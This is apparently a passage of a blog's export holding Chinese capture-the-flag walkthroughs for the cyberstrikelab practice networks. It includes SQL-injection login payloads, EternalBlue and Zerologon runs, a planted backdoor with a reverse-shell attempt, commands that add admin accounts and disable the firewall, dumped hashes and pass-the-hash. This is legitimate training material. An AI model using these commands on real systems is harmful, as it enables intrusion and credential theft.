rusty_joomla_exploit.py -t http://192.168.10.10/ -l 172.16.233.2 -p 1234Found existing alias for python3. You should use: p[*] Starting ..[*] Target URL: http://192.168.10.10/index.php/component/users[*] Getting Session Cookie ..[*] Getting CSRF Token ..[*] Sending request ..[+] Vulnerable[*] Use --exploit to exploit it(base) rusty_joomla_rce [master] python3 rusty_joomla_exploit.py -t http://192.168.10.10/ -l 172.16.233.2 -p 1234 --exploitFound existing alias for python3. You should use: p[*] Starting ..[*] Target URL: http://192.168.10.10/index.php/component/users[*] Getting Session Cookie ..[*] Getting CSRF Token ..[*] Sending request ..[+] Vulnerable[*] Getting Session Cookie ..[*] Getting CSRF Token ..[*] Sending request ..[+] Backdoor implanted, eval your code at http://192.168.10.10//configuration.php in a POST with eydvcgsfvmdilfjocumycytgntgqcsuqwrmyobsrjabzsspezp[*] Now its time to reverse, trying with a system + perl Joomla 10没有内网 weblogicweblogic有命令执行，就是权限比较低 192.168.20.30:139 open192.168.20.20:139 open192.168.20.30:88 open192.168.20.20:7001 open192.168.20.30:445 open192.168.20.20:445 open192.168.20.30:135 open192.168.20.20:135 open192.168.20.30:80 open[*] NetBios 192.168.20.20 cyberweb.cyberstrikelab.com Windows Server 2012 R2 Standard 9600[*] NetInfo [*]192.168.20.30 [-]WIN-9DJ4TH21IE9 [-]192.168.20.30[*] NetBios 192.168.20.30 [+] DC:WIN-9DJ4TH21IE9.cyberstrikelab.com Windows Server 2016 Standard 14393[+] MS17-010 192.168.20.30\t(Windows Server 2016 Standard 14393)[*] WebTitle http://192.168.20.30 code:200 len:703 title:IIS Windows Server[+] PocScan http://192.168.20.30 poc-yaml-active-directory-certsrv-detect [*] WebTitle http://192.168.20.20:7001 code:404 len:1164 title:Error 404--Not Found[+] InfoScan http://192.168.20.20:7001 [weblogic] [+] PocScan http://192.168.20.20:7001 poc-yaml-weblogic-cve-2019-2725 v12 MS17-010PS C:\\Users\\Public certutil -config - -ping找不到活动证书颁发机构: 没有可用的数据了。 0x80070103 (WIN32/HTTP: 259 ERROR_NO_MORE_ITEMS)CertUtil: -ping 失败: 0x80070103 (WIN32/HTTP: 259 ERROR_NO_MORE_ITEMS)CertUtil: 没有可用的数据了。PS C:\\Users\\Public certutil -dump -vCertUtil: -dump 命令成功完成。 msv : [00000003] Primary * Username : CYBERWEB$ * Domain : CYBERSTRIKELAB * NTLM : 8678dfc0a0e2ad32e597a9916c65819a * SHA1 : 3afa5b2e255382ee4ba45b3372a9c4e4f207c8c1 发现打不了ADCS，再扫一下发现ms17-010 msf6 exploit(windows/smb/ms17_010_eternalblue) use auxiliary/admin/smb/ms17_010_commandmsf6 auxiliary(admin/smb/ms17_010_command) set COMMAND type C:\\flag.txtCOMMAND = type C:\\flag.txtmsf6 auxiliary(admin/smb/ms17_010_command) set RHOSTS 192.168.20.30RHOSTS = 192.168.20.30rmsf6 auxiliary(admin/smb/ms17_010_command) run[*] 192.168.20.30:445 - Target OS: Windows Server 2016 Standard 14393[*] 192.168.20.30:445 - Built a write-what-where primitive...[+] 192.168.20.30:445 - Overwrite complete... SYSTEM session obtained![+] 192.168.20.30:445 - Service start timed out, OK if running a command or non-service executable...[*] 192.168.20.30:445 - Getting the command output...[*] 192.168.20.30:445 - Executing cleanup...[+] 192.168.20.30:445 - Cleanup was successful[+] 192.168.20.30:445 - Command completed successfully![*] 192.168.20.30:445 - Output for type C:\\flag.txt:go-flagkqqjRIRRoiJO5JIm[*] 192.168.20.30:445 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed","tags":["Joomla","weblogic","MS17-010"]},{"title":"cyberstrikelab lab5","path":"/2025/07/15/lab5/","content":"lab5 靶机ip: 192.168. 攻击机ip: 192.168. 信息收集(base) Downloads fscan -h 192.168.10.0/24192.168.10.233:22 open192.168.10.10:135 open192.168.10.10:139 open192.168.10.10:445 open192.168.10.10:3306 open192.168.10.233:8080 open192.168.10.10:7680 open[*] alive ports len is: 7start vulscan已完成 0/7 [-] Ms17010 192.168.10.10 read tcp 172.16.233.2:49640-192.168.10.10:445: read: connection reset by peer[*] WebTitle https://192.168.10.233:8080 code:404 len:19 title:None (base) qscan ./qscan_mac_arm64 -t 192.168.10.10 -p 1-65535\t┏┓┏┏┏┓┏┓\t┗┫┛┗┗┻┛┗ ┗Tips: 可以使用--spy 10.10.20.1，将会对该网址10.10.20.1/16(B段)进行网关存活性探测[+]2025/07/15 14:24:20 当前环境为：darwin, 输出编码为：utf-8[+]2025/07/15 14:24:20 成功加载HTTP指纹:[24758]条[+]2025/07/15 14:24:20 成功加载NMAP探针:[150]个,指纹[11916]条[*]2025/07/15 14:24:20 未检测到qqwry.dat,将关闭CDN检测功能，如需开启，请执行kscan --download-qqwry下载该文件[+]2025/07/15 14:24:21 Domain、IP、Port、URL、Hydra引擎已准备就绪[+]2025/07/15 14:24:21 所有扫描任务已下发完毕netbios://192.168.10.10:139 netbios OperatingSystem:Windows,Port:139,Digest:\\x83\\x00\\x00\\x01\\x8f,Length:5,ProductName:osoftWindowsnetbios-sssmb://192.168.10.10:445 smb Port:445,Digest:SMB@Ag7HZ^I/?`@`+00,0+7,Length:518mysql://192.168.10.10:3306 mysql Port:3306,DeviceType:cpe:,ProductName:MySQL,Length:76,Info:unauthorized,Digest:HjHost192.168.122.177http://192.168.10.10:6582 BEES企业网站管理系统_企业建站系统_外贸网站建设_企业CMS_PHP营销企业网站模板_免费开源的PHP企业网站程序 Port:6582,FoundDomain:r、wpa.qq.com、tips.style.,FingerPrint:后台;BEES企业网站管理系统;PHP;BeeS_CMS;The-enterprise-QQ;BeeS-CMS;Apache;ActiveX;Object;JQuery;Adobe-Flash;bees_cms;Apachehttpd/2.4.39;Apachehttpd;v;(Win64)OpenSSL/1.1.1bmod_fcgid/2.3.9amod_log_rotate/1.02,Digest:企业网站管理系统，是一套模板程序完全分离，采用,Length:17932[+]2025/07/15 14:25:35 程序执行总时长为：[1m15.244469166s] beecms-rce发现beecms，进入/admin/login.php伪造登录 user=-1+uniselecton+selselectect+1,admin,e10adc3949ba59abbe56e057f20f883e,0,0+%23password=123456 再放包即可成功进入后台,然后添加上传文件类型 访问/admin/admin_file_upload.php 直接上传 内网扫描结果为 192.168.20.10:445 open192.168.20.30:139 open192.168.20.30:88 open192.168.20.20:8080 open192.168.20.10:3306 open192.168.20.30:445 open192.168.20.20:445 open192.168.20.20:139 open192.168.20.10:139 open192.168.20.30:135 open192.168.20.20:135 open192.168.20.10:135 open192.168.20.20:8009 open192.168.20.10:7680 open[*] NetInfo [*]192.168.20.30 [-]WIN-7NRTJO59O7N [-]192.168.20.30[*] NetInfo [*]192.168.20.20 [-]cyberweb [-]192.168.20.20[*] NetBios 192.168.20.20 cyberweb.cyberstrikelab.com Windows Server 2012 R2 Standard 9600[*] WebTitle http://192.168.20.20:8080 code:200 len:1554 title:Welcome to JBoss AS[+] InfoScan http://192.168.20.20:8080 [Jboss] CVE-2017-12149 依次执行 REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /fnet user cc Admin@123 /addnet localgroup Administrators cc /addnetsh firewall set opmode disable 远程桌面登录即可 查看一下SID,这里查看机器账户的SID，进入注册表进行查看，win+r后输入regedit,回车进入注册表，选择路径到HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList进行查看 机器用户的SID是 S-1-5-21-3614065708-1162526928-2578637-1104 MS14-068（CVE-2014-6324）抓取hash 生成伪造的TGT C:\\Users\\cc\\Desktop.\\MS14-068.exe -u cyberweb$@cyberstrikelab.com -s S-1-5-21-3614065708-1162526928-2578637-1104 -d 192.168.20.30 --rc4 5ce8fa6cc82ba044908aec1cd181195a 通过mimikatz将伪造出来的TGT注入票证 .\\mimikatz.exe kerberos::ptc TGT_cyberweb$@cyberstrikelab.com.ccache exit 对域内的资源进行访问，开始读取第三台机器的flag。","tags":["beecms-rce","CVE-2017-12149","MS14-068(CVE-2014-6324)"]},{"title":"cyberstrikelab lab4","path":"/2025/07/15/lab4/","content":"lab4信息收集(base) dirsearch [master●●] fscan -h 192.168.10.10 -p 1-65535 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| __/ _` |/ __| |/ // /_\\\\_____\\__ \\ (__| | | (_| | (__| \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.8.4start infoscan192.168.10.10:135 open192.168.10.10:445 open192.168.10.10:139 open192.168.10.10:3306 open192.168.10.10:3389 open192.168.10.10:5040 open192.168.10.10:5820 open192.168.10.10:7680 open192.168.10.10:49664 open192.168.10.10:49670 open192.168.10.10:49665 open192.168.10.10:49667 open192.168.10.10:49666 open192.168.10.10:49668 open192.168.10.10:49669 open[*] alive ports len is: 15start vulscan[*] WebTitle http://192.168.10.10:5820 code:200 len:9243 title:演示网站 - Powered by BlueCMS[+] InfoScan http://192.168.10.10:5820 [CMS]已完成 14/15 [-] (45/210) rdp 192.168.10.10:3389 administrator !QAZ2wsx remote error: tls: access denied已完成 14/15 [-] (89/210) rdp 192.168.10.10:3389 admin admin111 remote error: tls: access denied已完成 14/15 [-] (134/210) rdp 192.168.10.10:3389 admin qwe123!@# remote error: tls: access denied已完成 14/15 [-] (179/210) rdp 192.168.10.10:3389 guest a123456. remote error: tls: access denied已完成 15/15[*] 扫描结束,耗时: 5m23.261260333s bluecms-rcehttp://192.168.10.10:5820是bluecms1.6，先sql注入拿密码 (base) dirsearch [master●●] sqlmap -u http://192.168.10.10:5820/ad_js.php?ad_id=1 --dbs --dbms=mysql --batchavailable databases [2]:[*] bluecms[*] information_schema(base) dirsearch [master●●] sqlmap -u http://192.168.10.10:5820/ad_js.php?ad_id=1 -D bluecms --tables --dbms=mysql --batchDatabase: bluecms[29 tables]+------------------+| blue_ad || blue_ad_phone || blue_admin || blue_admin_log || blue_ann || blue_ann_cat || blue_arc_cat || blue_area || blue_article || blue_attachment || blue_buy_record || blue_card_order || blue_card_type || blue_category || blue_comment || blue_config || blue_flash_image || blue_guest_book || blue_ipbanned || blue_link || blue_model || blue_navigate || blue_pay || blue_post || blue_post_att || blue_post_pic || blue_service || blue_task || blue_user |+------------------+(base) dirsearch [master●●] sqlmap -u http://192.168.10.10:5820/ad_js.php?ad_id=1 -D bluecms -T blue_admin --dump --dbms=mysql --batch[10:12:29] [INFO] cracked password admin123456 for hash a66abb5684c45962d887564f08346e8dDatabase: bluecmsTable: blue_admin[1 entry]+----------+------------------------------------------------+-------------------+---------+------------+------------+---------------+-----------------+| admin_id | pwd | email | purview | add_time | admin_name | last_login_ip | last_login_time |+----------+------------------------------------------------+-------------------+---------+------------+------------+---------------+-----------------+| 1 | a66abb5684c45962d887564f08346e8d (admin123456) | cyber@outlook.com | all | 1734945468 | admin | blank | 1736905203 |+----------+------------------------------------------------+-------------------+---------+------------+------------+---------------+-----------------+ http://192.168.10.10:5820/admin/login.php?act=login 修改模板 http://192.168.10.10:5820/admin/tpl_manage.php?act=edittpl_name=ann.htm http://192.168.10.10:5820/admin/tpl_manage.php?act=edittpl_name=../../ann.php 然后访问 http://192.168.10.10:5820/ann.php 内网扫描 192.168.20.10:3306 open192.168.20.20:445 open192.168.20.30:445 open192.168.20.20:139 open192.168.20.10:445 open192.168.20.30:139 open192.168.20.10:139 open192.168.20.20:135 open192.168.20.30:135 open192.168.20.10:135 open192.168.20.10:7680 open192.168.20.20:7001 open192.168.20.30:88 open[*] NetInfo [*]192.168.20.20 [-]cyberweb [-]192.168.20.20[*] NetBios 192.168.20.20 cyberweb.cyberstrikelab.com Windows Server 2012 R2 Standard 9600[*] WebTitle http://192.168.20.20:7001 code:404 len:1164 title:Error 404--Not Found[+] InfoScan http://192.168.20.20:7001 [weblogic] weblogic攻击失败，尝试ms17-010 CVE-2020-1472 (base) CVE-2020-1472 [master] python3 cve-2020-1472-exploit.py WIN-7NRTJO59O7N 192.168.20.30Found existing alias for python3. You should use: pPerforming authentication attempts...=====================================Target vulnerable, changing account password to empty stringResult: 0Exploit complete! (base) examples [master●] python3 secretsdump.py cyberstrikelab.com/WIN-7NRTJO59O7N\\$@192.168.20.30 -no-pass -just-dcFound existing alias for python3. You should use: p/opt/anaconda3/lib/python3.12/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools81. import pkg_resourcesImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)[*] Using the DRSUAPI method to get NTDS.DIT secretsAdministrator:500:aad3b435b51404eeaad3b435b51404ee:00f995cbe63fd30411f44d434b8dac98:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5bc02b7670084dd30471730cc0a1672c:::cyberstrikelab.com\\cyberweb:1105:aad3b435b51404eeaad3b435b51404ee:5ec3abbedd0da75d8005ace9df885235:::WIN-7NRTJO59O7N$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::CYBERWEB$:1103:aad3b435b51404eeaad3b435b51404ee:2ea60347325a8ff9d387c1d98e884edf:::[*] Kerberos keys grabbedAdministrator:aes256-cts-hmac-sha1-96:8d74431b0327e988758096706b686561178b506b54c392bc7fc983d795885a4dAdministrator:aes128-cts-hmac-sha1-96:b341d7dde651392ecefbe9d668aa70bcAdministrator:des-cbc-md5:83b5fdef49431929Administrator:rc4_hmac:00f995cbe63fd30411f44d434b8dac98krbtgt:aes256-cts-hmac-sha1-96:81eac4fb1383dcbc80cb124aa6074c889f22c4801c0a7825bf8195f77c5cf725krbtgt:aes128-cts-hmac-sha1-96:65195790b2a7748a2bab4d9fd0e4ef89krbtgt:des-cbc-md5:196bd04fa28c8531krbtgt:rc4_hmac:5bc02b7670084dd30471730cc0a1672ccyberstrikelab.com\\cyberweb:aes256-cts-hmac-sha1-96:526cc567241dd83de3c3239db367cc969558522a6231f7257542bf85a7454ca3cyberstrikelab.com\\cyberweb:aes128-cts-hmac-sha1-96:55677ca76ede6687cb63b0c2fcb15274cyberstrikelab.com\\cyberweb:des-cbc-md5:dfad29f2467aa82fcyberstrikelab.com\\cyberweb:rc4_hmac:5ec3abbedd0da75d8005ace9df885235WIN-7NRTJO59O7N$:aes256-cts-hmac-sha1-96:4715be0a05fa5448f368d1542b1a3117301d9b69ef8044a76256dbfcdce33e93WIN-7NRTJO59O7N$:aes128-cts-hmac-sha1-96:518e862b4f821ec9894373f2df4bb8b4WIN-7NRTJO59O7N$:des-cbc-md5:9291ce2a765d6270WIN-7NRTJO59O7N$:rc4_hmac:31d6cfe0d16ae931b73c59d7e0c089c0CYBERWEB$:aes256-cts-hmac-sha1-96:d5c2d7ed7ae9c2e8a278afddfa7e3e79f01311ca3d9644de5653bb57ccba4ce6CYBERWEB$:aes128-cts-hmac-sha1-96:f0240627cb35be4737f721f29aab7a54CYBERWEB$:des-cbc-md5:3e325b4a2040a1bfCYBERWEB$:rc4_hmac:2ea60347325a8ff9d387c1d98e884edf[*] Cleaning up... (base) examples [master●] python3 psexec.py -hashes :00f995cbe63fd30411f44d434b8dac98 cyberstrikelab.com/Administrator@192.168.20.30Found existing alias for python3. You should use: p/opt/anaconda3/lib/python3.12/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools81. import pkg_resourcesImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies[*] Requesting shares on 192.168.20.30.....[*] Found writable share ADMIN$[*] Uploading file rVGNkHey.exe[*] Opening SVCManager on 192.168.20.30.....[*] Creating service ODRE on 192.168.20.30.....[*] Starting service ODRE.....[!] Press help for extra shell commands[-] Decoding error detected, consider running chcp.com at the target,map the result with https://docs.python.org/3/library/codecs.html#standard-encodingsand then execute smbexec.py again with -codec and the corresponding codecMicrosoft Windows [�汾 6.1.7600][-] Decoding error detected, consider running chcp.com at the target,map the result with https://docs.python.org/3/library/codecs.html#standard-encodingsand then execute smbexec.py again with -codec and the corresponding codec��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����C:\\Windows\\system32 因为30是域控，直接横向即可","tags":["CVE-2020-1472","bluecms-rce"]},{"title":"cyberstrikelab lab1","path":"/2025/07/14/lab1/","content":"lab1信息收集thinkphp5-rce(base) Downloads curl http://192.168.10.10/data/conf/version.txtv1.0.9 但是fscan扫出来有 [+] PocScan http://192.168.10.10 poc-yaml-thinkphp5023-method-rce poc1 thinkphp漏洞 在C:/phpstudy_pro/WWW/eyoucms1.0/application/database.php找到数据库用户名及密码 数据库没找到东西，这台机器是双网卡，继续看内网 内网扫描结果为 192.168.20.20:135 open192.168.20.30:88 open192.168.20.10:3306 open192.168.20.30:445 open192.168.20.20:445 open192.168.20.10:445 open192.168.20.30:139 open192.168.20.20:139 open192.168.20.10:139 open192.168.20.30:135 open192.168.20.10:135 open192.168.20.10:80 open[*] NetBios 192.168.20.10 WORKGROUP\\WIN-KOHRC1DGOL9 Windows Server 2012 R2 Standard 9600[*] NetInfo [*]192.168.20.20 [-]cyberweb [-]192.168.20.20[+] MS17-010 192.168.20.30\t(Windows Server 2008 R2 Standard 7600)[*] NetInfo [*]192.168.20.30 [-]WIN-7NRTJO59O7N [-]192.168.20.30[*] NetBios 192.168.20.20 cyberweb.cyberstrikelab.com Windows Server 2012 R2 Standard 9600[+] MS17-010 192.168.20.20\t(Windows Server 2012 R2 Standard 9600)[*] WebTitle http://192.168.20.10 code:200 len:25157 title:易优CMS - Powered by Eyoucms.com[+] PocScan http://192.168.20.10 poc-yaml-thinkphp5023-method-rce poc1 ms17-010msf6 auxiliary(admin/smb/ms17_010_command) use exploit/windows/smb/ms17_010_eternalblue[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17[*] Using configured payload windows/x64/meterpreter/bind_tcp_uuid[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17msf6 exploit(windows/smb/ms17_010_eternalblue) set RHOSTS 192.168.20.30[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17RHOSTS = 192.168.20.30[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17msf6 exploit(windows/smb/ms17_010_eternalblue) run[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17[*] 192.168.20.30:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check[proxychains] Strict chain ... 192.168.1.93:7777 ... 192.168.20.30:445 ... OK[proxychains] Strict chain ... 192.168.1.93:7777 ... 192.168.20.30:135 ... OK[+] 192.168.20.30:445 - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7600 x64 (64-bit)[*] 192.168.20.30:445 - Scanned 1 of 1 hosts (100% complete)[+] 192.168.20.30:445 - The target is vulnerable.[*] 192.168.20.30:445 - Connecting to target for exploitation.[proxychains] Strict chain ... 192.168.1.93:7777 ... 192.168.20.30:445 ... OK[+] 192.168.20.30:445 - Connection established for exploitation.[+] 192.168.20.30:445 - Target OS selected valid for OS indicated by SMB reply[*] 192.168.20.30:445 - CORE raw buffer dump (36 bytes)[*] 192.168.20.30:445 - 0x00000000 57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32 Windows Server 2[*] 192.168.20.30:445 - 0x00000010 30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20 008 R2 Standard[*] 192.168.20.30:445 - 0x00000020 37 36 30 30 7600[+] 192.168.20.30:445 - Target arch selected valid for arch indicated by DCE/RPC reply[*] 192.168.20.30:445 - Trying exploit with 12 Groom Allocations.[*] 192.168.20.30:445 - Sending all but last fragment of exploit packet[*] 192.168.20.30:445 - Starting non-paged pool grooming[proxychains] Strict chain ... 192.168.1.93:7777 ... 192.168.20.30:445 ... OK[+] 192.168.20.30:445 - Sending SMBv2 buffers[proxychains] Strict chain ... 192.168.1.93:7777 ... 192.168.20.30:445 ... OK[proxychains] Strict chain ... 192.168.1.93:7777 ... 192.168.20.30:445 ... OK[proxychains] Strict chain ... 192.168.1.93:7777 ... 192.168.20.30:445 ... OK[proxychains] Strict chain ... 192.168.1.93:7777 ... 192.168.20.30:445 ... OK[proxychains] Strict chain ... 192.168.1.93:7777 ... 192.168.20.30:445 ... OK[proxychains] Strict chain ... 192.168.1.93:7777 ... 192.168.20.30:445 ... OK[proxychains] Strict chain ... 192.168.1.93:7777 ... 192.168.20.30:445 ... OK[proxychains] Strict chain ... 192.168.1.93:7777 ... 192.168.20.30:445 ... OK[proxychains] Strict chain ... 192.168.1.93:7777 ... 192.168.20.30:445 ... OK[proxychains] Strict chain ... 192.168.1.93:7777 ... 192.168.20.30:445 ... OK[proxychains] Strict chain ... 192.168.1.93:7777 ... 192.168.20.30:445 ... OK[proxychains] Strict chain ... 192.168.1.93:7777 ... 192.168.20.30:445 ... OK[proxychains] Strict chain ... 192.168.1.93:7777 ... 192.168.20.30:445 ... OK[+] 192.168.20.30:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.[*] 192.168.20.30:445 - Sending final SMBv2 buffers.[proxychains] Strict chain ... 192.168.1.93:7777 ... 192.168.20.30:445 ... OK[proxychains] Strict chain ... 192.168.1.93:7777 ... 192.168.20.30:445 ... OK[proxychains] Strict chain ... 192.168.1.93:7777 ... 192.168.20.30:445 ... OK[proxychains] Strict chain ... 192.168.1.93:7777 ... 192.168.20.30:445 ... OK[proxychains] Strict chain ... 192.168.1.93:7777 ... 192.168.20.30:445 ... OK[proxychains] Strict chain ... 192.168.1.93:7777 ... 192.168.20.30:445 ... OK[*] 192.168.20.30:445 - Sending last fragment of exploit packet![*] 192.168.20.30:445 - Receiving response from exploit packet[+] 192.168.20.30:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)![*] 192.168.20.30:445 - Sending egg to corrupted connection.[*] 192.168.20.30:445 - Triggering free of corrupted buffer.[*] Started bind TCP handler against 192.168.20.30:80[proxychains] Strict chain ... 192.168.1.93:7777 ... 192.168.20.30:80 ... OK[*] Sending stage (203846 bytes) to 192.168.20.30[proxychains] DLL init: proxychains-ng 4.17[*] Meterpreter session 1 opened (192.168.1.5:51062 - 192.168.1.93:7777) at 2025-07-14 16:54:12 +0800[+] 192.168.20.30:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[+] 192.168.20.30:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[+] 192.168.20.30:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17meterpreter 但是切换shell会失败，直接使用命令打开远程桌面 msf6 auxiliary(admin/smb/ms17_010_command) set COMMAND REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17COMMAND = REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17msf6 auxiliary(admin/smb/ms17_010_command) set RHOSTS 192.168.20.30[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17RHOSTS = 192.168.20.30[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17msf6 auxiliary(admin/smb/ms17_010_command) run[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17[proxychains] Strict chain ... 192.168.1.93:7777 ... 192.168.20.30:445 ... OK[*] 192.168.20.30:445 - Target OS: Windows Server 2008 R2 Standard 7600[*] 192.168.20.30:445 - Built a write-what-where primitive...[+] 192.168.20.30:445 - Overwrite complete... SYSTEM session obtained![+] 192.168.20.30:445 - Service start timed out, OK if running a command or non-service executable...[*] 192.168.20.30:445 - Getting the command output...[*] 192.168.20.30:445 - Executing cleanup...[+] 192.168.20.30:445 - Cleanup was successful[+] 192.168.20.30:445 - Command completed successfully![*] 192.168.20.30:445 - Output for REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f:����ɹ���ɡ�[*] 192.168.20.30:445 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed set COMMAND net user cc Admin@123 /addset COMMAND net localgroup Administrators cc /addset COMMAND netsh firewall set opmode disable 远程桌面连接即可 PTHmeterpreter hashdump[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17Administrator:500:aad3b435b51404eeaad3b435b51404ee:94bd5248e87cb7f2f9b871d40c903927:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5bc02b7670084dd30471730cc0a1672c:::cyberweb:1105:aad3b435b51404eeaad3b435b51404ee:2de5cd0f15d1c070851d1044e1d95c90:::cc:1106:aad3b435b51404eeaad3b435b51404ee:570a9a65db8fba761c1008a51d4c95ab:::WIN-7NRTJO59O7N$:1000:aad3b435b51404eeaad3b435b51404ee:076e954964d4fe7064ed7076b4080388:::CYBERWEB$:1103:aad3b435b51404eeaad3b435b51404ee:db562221eace84ee3f1a391337e72404:: (base) examples [master●] python3 psexec.py -hashes :94bd5248e87cb7f2f9b871d40c903927 cyberstrikelab.com/Administrator@192.168.20.20Found existing alias for python3. You should use: p/opt/anaconda3/lib/python3.12/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools81. import pkg_resourcesImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies[*] Requesting shares on 192.168.20.20.....[*] Found writable share ADMIN$[*] Uploading file kODLdmwr.exe[*] Opening SVCManager on 192.168.20.20.....[*] Creating service LEWz on 192.168.20.20.....[*] Starting service LEWz.....[!] Press help for extra shell commands[-] Decoding error detected, consider running chcp.com at the target,map the result with https://docs.python.org/3/library/codecs.html#standard-encodingsand then execute smbexec.py again with -codec and the corresponding codecMicrosoft Windows [�汾 6.3.9600][-] Decoding error detected, consider running chcp.com at the target,map the result with https://docs.python.org/3/library/codecs.html#standard-encodingsand then execute smbexec.py again with -codec and the corresponding codec(c) 2013 Microsoft Corporation����������Ȩ����C:\\Windows\\system32","tags":["thinkphp5-rce","ms17-010","pth"]},{"title":"cyberstrikelab lab3","path":"/2025/07/14/lab3/","content":"lab3信息收集(base) Downloads fscan -h 192.168.10.0/24192.168.10.233:22 open192.168.10.10:135 open192.168.10.10:139 open192.168.10.10:445 open192.168.10.10:3306 open192.168.10.233:8080 open[*] alive ports len is: 6start vulscan已完成 0/6 [-] mysql 192.168.10.10:3306 root 123456 Error 1130: Host 192.168.122.253 is not allowed to connect to this MySQL server[*] WebTitle https://192.168.10.233:8080 code:404 len:19 title:None已完成 5/6 [-] ssh 192.168.10.233:22 root root@2019 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 发现没什么利用点，继续扫全端口 (base) Downloads fscan -h 192.168.10.10 -p 1-65535 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| __/ _` |/ __| |/ // /_\\\\_____\\__ \\ (__| | | (_| | (__| \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.8.4start infoscan192.168.10.10:135 open192.168.10.10:139 open192.168.10.10:445 open192.168.10.10:3306 open192.168.10.10:3590 open192.168.10.10:5040 open taocms默认口令getshell 发现默认账号密码，渗透过程参考https://blog.csdn.net/2302_82189125/article/details/140086872 192.168.20.10:135 open192.168.20.30:88 open192.168.20.30:139 open192.168.20.20:139 open192.168.20.30:135 open192.168.20.10:139 open192.168.20.20:135 open192.168.20.20:3306 open192.168.20.10:3306 open192.168.20.30:445 open192.168.20.20:445 open192.168.20.10:445 open[*] NetInfo [*]192.168.20.30 [-]WIN-7NRTJO59O7N [-]192.168.20.30[*] NetInfo [*]192.168.20.20 [-]cyberweb [-]192.168.20.20[*] NetBios 192.168.20.20 cyberweb.cyberstrikelab.com Windows Server 2012 R2 Standard 9600192.168.20.20:135 open192.168.20.20:445 open192.168.20.20:139 open192.168.20.20:3306 open192.168.20.20:5985 open192.168.20.20:8055 open http://192.168.20.20:8055/发现thinkphp，题目提示 flag.txt 